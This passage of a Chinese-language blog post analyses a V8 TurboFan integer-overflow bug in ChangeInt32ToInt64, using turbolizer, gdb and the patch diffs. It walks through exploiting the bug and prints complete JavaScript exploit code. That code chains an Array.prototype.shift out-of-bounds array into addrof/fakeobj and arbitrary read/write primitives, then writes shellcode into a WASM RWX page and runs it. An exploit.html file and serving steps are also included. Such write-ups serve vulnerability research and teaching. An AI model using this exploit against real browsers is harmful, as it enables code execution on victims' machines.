class="keyword">function</span> <span class="title">arbread</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    <span class="keyword">return</span> (fake[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbwrite</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    fake[<span class="number">0</span>] = itof(BigInt(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_shellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf2);</span><br><span class="line">    <span class="keyword">let</span> buf_addr = addrof(buf2);</span><br><span class="line">    <span class="keyword">let</span> backing_store_addr = buf_addr + <span class="number">0x14n</span>;</span><br><span class="line">    arbwrite(backing_store_addr, addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint32(<span class="number">4</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + <span class="number">0x68n</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Address of rwx page: &quot;</span> + rwx_page_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">3833809148</span>,<span class="number">12642544</span>,<span class="number">1363214336</span>,<span class="number">1364348993</span>,<span class="number">3526445142</span>,<span class="number">1384859749</span>,<span class="number">1384859744</span>,<span class="number">1384859672</span>,<span class="number">1921730592</span>,<span class="number">3071232080</span>,<span class="number">827148874</span>,<span class="number">3224455369</span>,<span class="number">2086747308</span>,<span class="number">1092627458</span>,<span class="number">1091422657</span>,<span class="number">3991060737</span>,<span class="number">1213284690</span>,<span class="number">2334151307</span>,<span class="number">21511234</span>,<span class="number">2290125776</span>,<span class="number">1207959552</span>,<span class="number">1735704709</span>,<span class="number">1355809096</span>,<span class="number">1142442123</span>,<span class="number">1226850443</span>,<span class="number">1457770497</span>,<span class="number">1103757128</span>,<span class="number">1216885899</span>,<span class="number">827184641</span>,<span class="number">3224455369</span>,<span class="number">3384885676</span>,<span class="number">3238084877</span>,<span class="number">4051034168</span>,<span class="number">608961356</span>,<span class="number">3510191368</span>,<span class="number">1146673269</span>,<span class="number">1227112587</span>,<span class="number">1097256961</span>,<span class="number">1145572491</span>,<span class="number">1226588299</span>,<span class="number">2336346113</span>,<span class="number">21530628</span>,<span class="number">1096303056</span>,<span class="number">1515806296</span>,<span class="number">1497454657</span>,<span class="number">2202556993</span>,<span class="number">1379999980</span>,<span class="number">1096343807</span>,<span class="number">2336774745</span>,<span class="number">4283951378</span>,<span class="number">1214119935</span>,<span class="number">442</span>,<span class="number">0</span>,<span class="number">2374846464</span>,<span class="number">257</span>,<span class="number">2335291969</span>,<span class="number">3590293359</span>,<span class="number">2729832635</span>,<span class="number">2797224278</span>,<span class="number">4288527765</span>,<span class="number">3296938197</span>,<span class="number">2080783400</span>,<span class="number">3774578698</span>,<span class="number">1203438965</span>,<span class="number">1785688595</span>,<span class="number">2302761216</span>,<span class="number">1674969050</span>,<span class="number">778267745</span>,<span class="number">6649957</span>];</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--exploit.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;exp.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> shell</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 -m http.server 80</span></span><br></pre></td></tr></table></figure></li>
<li><p>靶机关闭沙箱访问exploit<br><img src="https://z3.ax1x.com/2021/09/29/443Woq.png"></p>
</li>
</ol>
<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1. 基本信息"></a>1. 基本信息</h3><ul>
<li>漏洞文件：src/compiler/backend/x64/instruction-selector-x64.cc</li>
<li>漏洞函数：InstructionSelector::VisitChangeInt32ToInt64</li>
</ul>
<h3 id="2-背景知识"><a href="#2-背景知识" class="headerlink" title="2. 背景知识"></a>2. 背景知识</h3><p>V8 引擎工作基本流程图示：<br><img src="https://z3.ax1x.com/2021/09/29/4435WT.png"></p>
<p>工作流程简述：</p>
<ul>
<li>扫描所有代码，进行词法分析，生成 Tokens</li>
<li>Parser 解析器根据 Tokens 生成 AST</li>
<li>Ignition 解释器将 AST 转化为字节码并解释执行</li>
<li>TurboFan 编译器将热点函数编译优化成机器指令以提高效率</li>
</ul>
<p>TurboFan是 v8 的优化编译器，负责将字节码和一些分析数据作为输入并生成优化的机器代码。</p>
<p>当 Ignition 开始执行 JavaScript 代码后，V8 会一直观察 JavaScript 代码的执行情况，并记录执行信息，如每个函数的执行次数、每次调用函数时，传递的参数类型等。</p>
<p>如果一个函数被调用的次数超过了内设的阈值，监视器就会将当前函数标记为热点函数（Hot Function），并将该函数的字节码以及执行的相关信息发送给 TurboFan。TurboFan 会根据执行信息做出一些进一步优化此代码的假设，在假设的基础上将字节码编译为优化的机器代码。如果假设成立，那么当下一次调用该函数时，就会执行优化编译后的机器代码，以提高代码的执行性能。</p>
<p>那如果假设不成立进行 deoptimize（优化回退），将优化编译后的机器代码还原为字节码。</p>
<h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h3><h4 id="1-基础分析"><a href="#1-基础分析" class="headerlink" title="1. 基础分析"></a>1. 基础分析</h4><p>poc及输出如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> _arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.abs(x);</span><br><span class="line">	x -= <span class="number">2147483647</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.max(x, <span class="number">0</span>);</span><br><span class="line">	x -= <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(x==<span class="number">-1</span>) x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line">print(foo());</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x3000</span>; i ++)</span><br><span class="line">	foo();</span><br><span class="line">print(foo());</span><br><span class="line"><span class="comment">//0</span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>foo()</code>函数在编译优化前后的返回值不同</p>
<p>关键代码是这里</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>对这行代码执行流程和类型转换分析如下：</p>
<ol>
<li>_arr[0] 类型为 UInt32</li>
<li>_arr[0] ^ 0 之后类型转化成 Int32</li>
<li>为了之后的 +1 把 Int32 类型转化成 Int64</li>
<li>执行 Int64Add</li>
</ol>
<h4 id="2-静态分析"><a href="#2-静态分析" class="headerlink" title="2. 静态分析"></a>2. 静态分析</h4><p>用<code>turbolizer</code>分析优化过程，TFGenericLowering 阶段关键部分如下</p>
<p><img src="https://z3.ax1x.com/2021/09/29/443jFx.png"></p>
<p>下一个阶段 TFEarlyOptimization</p>
<p><img src="https://z3.ax1x.com/2021/09/29/443vY6.png"></p>
<p>WordXor 节点在优化被删掉，直接将左操作数往下传，优化代码如下：</p>
<p><img src="https://z3.ax1x.com/2021/09/29/448n1S.png"></p>
<p>再看最后的 TFLateGraphTrimming 阶段</p>
<p><img src="https://z3.ax1x.com/2021/09/29/448Gt0.png"></p>
<p>可以看到 Load 节点的类型是 Uint32，传入了 ChangeInt32ToInt64 节点，而ChangeInt32ToInt64 节点是接收 Int32 类型的，即这里本应该传入 Int32 但是编译优化后传入的是 UInt32，ChangeInt32ToInt64 指令选择代码如下：</p>
<p><img src="https://z3.ax1x.com/2021/09/29/448UcF.png"></p>
<p>综上，漏洞成因是 WordXor 节点被删除后 UInt32 未能转化成 Int32 就传入 ChangeInt32ToInt64，结果是 ChangeInt32ToInt64 的指令选择中原本应该用符号扩展却错误地使用了无符号扩展，导致整数溢出，在之后的一系列计算后把原本的正确值0变成了1。</p>
<h5 id="1-补丁Diff"><a href="#1-补丁Diff" class="headerlink" title="1. 补丁Diff"></a>1. 补丁Diff</h5><p><img src="https://z3.ax1x.com/2021/09/29/4480B9.png"></p>
<p>使 ChangeInt32ToInt64 将所有输入都当作 Int64 处理，使用带符号扩展指令。</p>
<h5 id="2-漏洞函数分析"><a href="#2-漏洞函数分析" class="headerlink" title="2. 漏洞函数分析"></a>2. 漏洞函数分析</h5><p>ChangeInt32ToInt64 是用来处理 Int32 的扩展的，但它也支持判断传入数据类型处理 UInt32 扩展，若错误地传入数据类型则会引起整数溢出。</p>
<h4 id="3-动态分析"><a href="#3-动态分析" class="headerlink" title="3. 动态分析"></a>3. 动态分析</h4><p>在 poc.js 中设置好断点和优化后的函数信息打印，用 gdb 调试</p>
<p>优化后代码如下</p>
<p><img src="https://z3.ax1x.com/2021/09/29/448yh6.png"></p>
<p>不带符号</p>
<h3 id="4-利用思路"><a href="#4-利用思路" class="headerlink" title="4. 利用思路"></a>4. 利用思路</h3><ul>
<li>利用这个整数溢出漏洞构造一个长度为1但编译器认为其长度为0的数组</li>
<li>通过 Array.prototype.shift() 获得一个长度为0xffffffff的越界数组</li>
<li>通过越界数组构造任意地址读写原语</li>
<li>修改 wasm 代码执行 shellcode</li>
</ul>
<h4 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1. 利用条件"></a>1. 利用条件</h4><p>V8 version &lt; 8.9.255.25</p>
<p>关闭沙箱</p>
<h4 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2. 利用过程"></a>2. 利用过程</h4><h5 id="构造整数溢出的数组"><a href="#构造整数溢出的数组" class="headerlink" title="构造整数溢出的数组"></a>构造整数溢出的数组</h5><p>利用上文分析的漏洞，不再赘述</p>
<h5 id="通过-Array-prototype-shift-获得一个长度为0xffffffff的越界数组"><a href="#通过-Array-prototype-shift-获得一个长度为0xffffffff的越界数组" class="headerlink" title="通过 Array.prototype.shift() 获得一个长度为0xffffffff的越界数组"></a>通过 Array.prototype.shift() 获得一个长度为0xffffffff的越界数组</h5><p>Array.prototype.shift() 是利用过程中需要用到的另一个漏洞，验证poc如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> _arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.abs(x);</span><br><span class="line">	x -= <span class="number">2147483647</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.max(x, <span class="number">0</span>);</span><br><span class="line">	x -= <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(x==<span class="number">-1</span>) x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(x);</span><br><span class="line">	arr.shift();</span><br><span class="line">	<span class="keyword">return</span> arr.length;</span><br><span class="line">&#125;</span><br><span class="line">print(foo());</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x3000</span>; i ++)</span><br><span class="line">	foo();</span><br><span class="line">print(foo());</span><br><span class="line"><span class="comment">//0</span></span><br><span class="line"><span class="comment">//-1</span></span><br></pre></td></tr></table></figure>

<p>shift 函数的作用是移除数组中的一个元素，同时长度减一，且减长度时没有长度为 0 的边界判断，但实际移除元素时若数组中没有元素会移除失败，长度也不会减一。</p>
<p>从 Turbolizer 中分析 TFSimplifiedLowering 阶段流程中<code>x</code>的可能值变化：</p>
<p><img src="https://z3.ax1x.com/2021/09/29/448g1O.png"></p>
<p>可见最终创建 Array 时<code>x</code>的值只能是 0 ，所以在 JIT 优化中认为 shift 之后的数组长度一定为 -1 ，直接将其写入到优化后的代码中：</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4484HA.png"></p>
<p>之所以是 0xfffffffe 而不是 0xffffffff 是因为在 V8 中，把数据的最后一位当成一个标志位，若为 0 则表示是一个 smi(small int) ，将其右移一位得到的值就是真实值；若为 1 则表示该值是一个地址，表示该地址处的一个对象，将其最后一位 1 变成 0 得到实际地址(因为对齐最后两位不用，这里算是将其利用起来)。</p>
<p>这里虽然 JIT 认为传入的<code>x</code>一定为 0 ，可是实际传入的值却是 1 ，导致数组中是有一个元素可供正常移除的，所以 shift 函数可以正常执行，得到一个长度为 0xffffffff 的越界数组。</p>
<p>这个漏洞也已经<a href="https://chromium-review.googlesource.com/c/v8/v8/+/2823707">修补</a>，在 pop 和 shift 的长度减一时加入了边界检查：</p>
<p><img src="https://z3.ax1x.com/2021/09/29/448H9f.png"></p>
<h5 id="通过越界数组构造任意地址读写原语"><a href="#通过越界数组构造任意地址读写原语" class="headerlink" title="通过越界数组构造任意地址读写原语"></a>通过越界数组构造任意地址读写原语</h5><p>这里需要了解 V8 对象的布局，比较复杂，参考<a href="https://segmentfault.com/a/1190000039908658">链接</a></p>
<p>在越界数组<code>arr</code>后接一个 float array 数组<code>cor</code>，调试确定偏移，利用<code>arr</code>修改<code>cor</code>的长度字段，得到一个越界 float array 数组，再利用这两个数组构造 <code>addrof</code> 和 <code>fakeobj</code> 原语：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">arr[<span class="number">16</span>] = <span class="number">0x4242</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发编译优化，用超长数组arr修改cor数组的长度(arr[16]的偏移由调试得出)，获得另一个类型为float的越界长数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    arr[<span class="number">7</span>] = k;</span><br><span class="line">    <span class="keyword">return</span> ftoi(cor[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    cor[<span class="number">0</span>] = itof(k);</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cor[0]和arr[7]指向同一个地址(调试得出)，由此构造addrof和fakeobj原语</span></span><br></pre></td></tr></table></figure>

<p>获取利用<code>cor</code>获取 float array 的 map 字段，创建一个 float array ，在该数组的数据中伪造另一个 float array 用 <code>fakeobj</code>将其转化成对象，这样就得到了一个完全可控的数组对象，可以用该对象中的 elements 实现任意地址读写。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> float_array_map = ftoi(cor[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr2 = [itof(float_array_map), <span class="number">1.2</span>, <span class="number">2.3</span>, <span class="number">3.4</span>];</span><br><span class="line"><span class="keyword">var</span> fake = fakeobj(addrof(arr2) + <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbread</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    <span class="keyword">return</span> (fake[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbwrite</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    fake[<span class="number">0</span>] = itof(BigInt(val));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用Array的element属性伪造一个Array，构造arbread和arbwrite原语实现任意地址读写</span></span><br></pre></td></tr></table></figure>



<p>但是 float array 写入高地址会失败，原因还未求证，据说网友说是因为 double 类型的浮点数数组在处理 0x7f 开头的高地址时会出现将低 20 位与运算为 0 ，从而导致上述操作无法写入的错误，有时间求证一下。</p>
<p>为解决这一问题使用 DataView 对象，DataView 对象的 buffer 结构体中存储着的 backing_store 属性，记录的就是实际 DataView 申请的 Buffer 的内存地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; job 0x299b081484c1</span><br><span class="line">0x299b081484c1: [JSDataView]</span><br><span class="line"> - map: 0x299b08302ca5 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x299b082c8071 &lt;Object map &#x3D; 0x299b08302ccd&gt;</span><br><span class="line"> - elements: 0x299b08042229 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - buffer &#x3D;0x299b08148489 &lt;ArrayBuffer map &#x3D; 0x299b083031f5&gt;</span><br><span class="line"> - byte_offset: 0</span><br><span class="line"> - byte_length: 16</span><br><span class="line"> - properties: 0x299b08042229 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"> - embedder fields &#x3D; &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x299b08148489</span><br><span class="line">0x299b08148489: [JSArrayBuffer]</span><br><span class="line"> - map: 0x299b083031f5 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x299b082c9c5d &lt;Object map &#x3D; 0x299b0830321d&gt;</span><br><span class="line"> - elements: 0x299b08042229 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - backing_store: 0x5611359e0300 &lt;-----存储实际内存地址</span><br><span class="line"> - byte_length: 16</span><br><span class="line"> - detachable</span><br><span class="line"> - properties: 0x299b08042229 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"> - embedder fields &#x3D; &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>如果用上面的任意地址读写将这个 backing_store 指针修改为我们想要写入的内存地址比如 0x41414141，那么我们再调用 view.setUint32(0, 0x44434241, true) 类似指令时，实际上就是向内存地址 0x41414141 处写入了 0x44434241 ，从而达到了任意地址写入的效果。这个基于 DataView 的写入，就不会触发 FloatArray 写入高地址的访问异常。</p>
<h5 id="Wasm"><a href="#Wasm" class="headerlink" title="Wasm"></a>Wasm</h5><p>Wasm 就是可以让 JavaScript 直接执行高级语言生成的机器码的一种技术。</p>
<p><a href="https://wasdk.github.io/WasmFiddle/">WasmFiddle</a></p>
<p>Wasm 不允许浏览器直接调用系统函数，我们可以把 shellcode 写入到 Wasm 的代码内存中覆盖掉，再调用接口执行的就是我们自己的 shellcode。</p>
<p>代码所在内存的偏移不同版本有所不同，需要调试寻找，大致在 instance 对象中某个偏移，打印出来对照 vmmap 找到那段 rwx 的内存就是了。</p>
<p><img src="https://z3.ax1x.com/2021/10/08/59HbcQ.png"></p>
<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//exploit.js</span></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>])</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Module(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> WebAssembly.Instance(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.exports.main;</span><br><span class="line"><span class="comment">//供之后用shellcode覆写后调用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u64_buf = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">	<span class="keyword">return</span> u64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">	u64_buf[<span class="number">0</span>] = val;</span><br><span class="line">	<span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ftoi和itof原语</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.abs(x);</span><br><span class="line">	x -= <span class="number">2147483647</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.max(x, <span class="number">0</span>);</span><br><span class="line">	x -= <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(x == <span class="number">-1</span>) x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(x);</span><br><span class="line">	arr.shift();</span><br><span class="line">	<span class="keyword">var</span> cor = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line">	<span class="keyword">return</span> [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//漏洞函数，先用本文漏洞构造整数溢出，再用Array.prototype.shift()的漏洞利用整数溢出构造越界超长数组arr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">0x3000</span>; ++i)</span><br><span class="line">    foo();</span><br><span class="line"></span><br><span class="line">[arr, cor] = foo();</span><br><span class="line"></span><br><span class="line">arr[<span class="number">16</span>] = <span class="number">0x4242</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发编译优化，用超长数组arr修改cor数组的长度(arr[16]的偏移由调试得出)，获得另一个类型为float的越界长数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    arr[<span class="number">7</span>] = k;</span><br><span class="line">    <span class="keyword">return</span> ftoi(cor[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    cor[<span class="number">0</span>] = itof(k);</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cor[0]和arr[7]指向同一个地址(调试得出)，由此构造addrof和fakeobj原语</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_map = ftoi(cor[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr2 = [itof(float_array_map), <span class="number">1.2</span>, <span class="number">2.3</span>, <span class="number">3.4</span>];</span><br><span class="line"><span class="keyword">var</span> fake = fakeobj(addrof(arr2) + <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbread</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    <span class="keyword">return</span> (fake[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbwrite</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    fake[<span class="number">0</span>] = itof(BigInt(val));</span><br><span 